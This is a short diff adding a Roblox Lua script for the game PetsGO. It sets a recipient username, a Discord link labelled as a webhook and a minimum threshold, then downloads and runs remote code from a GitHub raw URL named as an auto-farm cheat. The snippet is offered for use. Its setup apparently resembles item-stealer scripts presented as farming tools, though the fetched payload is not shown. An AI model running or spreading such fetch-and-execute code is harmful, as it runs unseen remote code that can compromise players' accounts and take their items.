@@ -1,0 +1,4 @@
+_G.User = "Scripter_po6"
+_G.Webhook = "https://discord.gg/JkJYNH22"
+_G.Min = 1 -- 2
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()```
